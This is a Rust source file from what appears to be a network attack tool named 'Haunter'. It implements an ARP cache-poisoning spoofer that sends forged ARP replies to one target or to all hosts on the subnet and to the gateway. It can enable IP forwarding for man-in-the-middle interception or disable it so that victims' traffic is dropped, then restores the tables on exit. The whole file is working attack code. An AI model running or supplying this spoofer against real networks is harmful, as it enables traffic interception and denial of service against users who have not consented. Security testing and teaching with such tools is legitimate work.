use std::fs;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use pnet::datalink::{MacAddr, NetworkInterface};

use crate::core::scanner;
use crate::error::{HaunterError, Result};
use crate::net::channel::Channel;
use crate::net::{arp, interface, Device};

const SPOOF_INTERVAL: Duration = Duration::from_secs(1);
const CHANNEL_READ_TIMEOUT: Duration = Duration::from_millis(100);
const RESTORE_ROUNDS: usize = 5;
const SCAN_TIMEOUT: Duration = Duration::from_secs(2);
const IP_FORWARD_PATH: &str = "/proc/sys/net/ipv4/ip_forward";

/// ARP spoofer that poisons the cache between targets and a gateway.
pub struct Spoofer {
    iface: NetworkInterface,
    our_mac: MacAddr,
    pub gateway_ip: Ipv4Addr,
    pub gateway_mac: MacAddr,
    pub targets: Vec<Device>,
    pub forward: bool,
}

impl Spoofer {
    /// Set up a spoofer for the given interface and gateway.
    ///
    /// If `target_ip` is `None`, all devices on the subnet are targeted.
    pub fn new(
        iface: NetworkInterface,
        gateway_ip: Ipv4Addr,
        target_ip: Option<Ipv4Addr>,
        forward: bool,
    ) -> Result<Self> {
        let our_mac = iface
            .mac
            .ok_or_else(|| HaunterError::Network("interface has no MAC address".into()))?;
        let network = interface::ipv4_network(&iface)?;
        let our_ip = network.ip();

        let gateway_mac = scanner::resolve_mac(&iface, our_mac, our_ip, gateway_ip)?;

        let targets = match target_ip {
            Some(ip) => {
                let mac = scanner::resolve_mac(&iface, our_mac, our_ip, ip)?;
                vec![Device { ip, mac }]
            }
            None => {
                let devices: Vec<Device> = scanner::scan(&iface, SCAN_TIMEOUT)?
                    .into_iter()
                    .filter(|d| d.ip != gateway_ip && d.ip != our_ip)
                    .collect();
                if devices.is_empty() {
                    return Err(HaunterError::Network(
                        "no targets found on the network".into(),
                    ));
                }
                devices
            }
        };

        Ok(Self {
            iface,
            our_mac,
            gateway_ip,
            gateway_mac,
            targets,
            forward,
        })
    }

    /// Run the spoofing loop until `stop` is signalled, then restore ARP tables.
    ///
    /// Status messages are sent through the `log` callback, keeping the core
    /// logic decoupled from any particular UI (CLI, Tauri, etc.).
    pub fn run(&self, stop: Arc<AtomicBool>, log: impl Fn(&str)) -> Result<()> {
        let original_forward = get_ip_forward();
        set_ip_forward(self.forward)?;

        if self.forward {
            log("[*] IP forwarding ENABLED (MITM mode).");
        } else {
            log("[*] IP forwarding DISABLED (traffic will be dropped).");
        }

        let mut channel = Channel::open(&self.iface, CHANNEL_READ_TIMEOUT)?;

        while !stop.load(Ordering::Relaxed) {
            self.send_poison(&mut channel)?;
            thread::sleep(SPOOF_INTERVAL);
        }

        log("[*] Restoring ARP tables...");
        self.restore(&mut channel)?;

        if let Err(e) = set_ip_forward(original_forward) {
            log(&format!("[!] Warning: failed to restore ip_forward: {e}"));
        } else {
            log(&format!("[*] Restored ip_forward to {original_forward}."));
        }

        log("[*] Done.");
        Ok(())
    }

    /// Send one round of poisoned ARP replies to all targets and the gateway.
    fn send_poison(&self, channel: &mut Channel) -> Result<()> {
        let mut buffer = [0u8; arp::FRAME_SIZE];

        for target in &self.targets {
            // Tell the target: "gateway IP is at OUR MAC"
            arp::build_reply(
                &mut buffer,
                self.our_mac,
                self.gateway_ip,
                target.mac,
                target.ip,
            );
            channel.send(&buffer)?;

            // Tell the gateway: "target IP is at OUR MAC"
            arp::build_reply(
                &mut buffer,
                self.our_mac,
                target.ip,
                self.gateway_mac,
                self.gateway_ip,
            );
            channel.send(&buffer)?;
        }

        Ok(())
    }

    /// Send correct ARP mappings to undo the poisoning.
    fn restore(&self, channel: &mut Channel) -> Result<()> {
        let mut buffer = [0u8; arp::FRAME_SIZE];

        for _ in 0..RESTORE_ROUNDS {
            for target in &self.targets {
                // Tell the target: "gateway IP is at GATEWAY's real MAC"
                arp::build_reply(
                    &mut buffer,
                    self.gateway_mac,
                    self.gateway_ip,
                    target.mac,
                    target.ip,
                );
                channel.send(&buffer)?;

                // Tell the gateway: "target IP is at TARGET's real MAC"
                arp::build_reply(
                    &mut buffer,
                    target.mac,
                    target.ip,
                    self.gateway_mac,
                    self.gateway_ip,
                );
                channel.send(&buffer)?;
            }
            thread::sleep(Duration::from_millis(200));
        }

        Ok(())
    }
}

/// Read the current ip_forward setting.
fn get_ip_forward() -> bool {
    fs::read_to_string(IP_FORWARD_PATH)
        .map(|s| s.trim() == "1")
        .unwrap_or(false)
}

/// Set ip_forward on or off.
fn set_ip_forward(enabled: bool) -> Result<()> {
    let value = if enabled { "1" } else { "0" };
    fs::write(IP_FORWARD_PATH, value)
        .map_err(|e| HaunterError::Network(format!("failed to set ip_forward: {e}")))
}
